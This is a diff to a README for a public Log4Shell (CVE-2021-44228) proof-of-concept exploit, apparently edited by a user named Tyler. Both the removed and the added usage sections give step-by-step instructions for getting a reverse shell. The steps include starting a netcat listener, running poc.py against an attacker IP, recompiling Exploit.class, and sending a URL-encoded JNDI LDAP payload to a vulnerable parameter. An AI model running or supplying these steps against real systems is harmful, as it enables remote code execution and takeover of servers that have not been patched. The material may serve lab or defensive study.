@@ -14,32 +14,20 @@ As a PoC there is a python file that automates the process.
 pip install -r requirements.txt
 ```
 #### Usage:
+(Note from Tyler - I re-wrote this because I found the original confusing.)
 
+### Getting a Shell
 
-* Start a netcat listener to accept reverse shell connection.<br>
-```py
-nc -lvnp 9001
-```
-* Launch the exploit.<br>
-**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.
-```py
-$ python3 poc.py --userip localhost --webport 8000 --lport 9001
-
-[!] CVE: CVE-2021-44228
-[!] Github repo: https://github.com/kozmer/log4j-shell-poc
-
-[+] Exploit java class created success
-[+] Setting up fake LDAP server
-
-[+] Send me: ${jndi:ldap://localhost:1389/a}
-
-Listening on 0.0.0.0:1389
-```
-
-This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.
-
-<br>
-
+1. Git clone this: https://github.com/kozmer/log4j-shell-poc 
+2. Download this JDK: https://download.oracle.com/java/21/latest/jdk-21_linux-x64_bin.tar.gz 
+3. Move it to the log4j directory created in step 1. 
+4. Unzip it: `tar -xf jdk-21_linux-x64_bin.tar.gz` 
+5. Rename it to `jdk1.8.0_20` 
+6. Set up a NC listener on port 1337
+7. Run the exploit: `python3 [poc.py](http://poc.py/) --userip 10.8.4.163 --webport 80 --lport 1337` 
+8. Delete the Exploit.class
+9. Re-compile the Exploit.class in the correct Java version: `javac -source 1.8 -target 1.8 Exploit.java` 
+10. Send the payload: `%24%7Bjndi%3Aldap%3A%2F%2F10.8.4.163%3A1389%2Fa%7D` (needed to be URL encoded in this example)
 
 Vulnerable application
 --------------------------
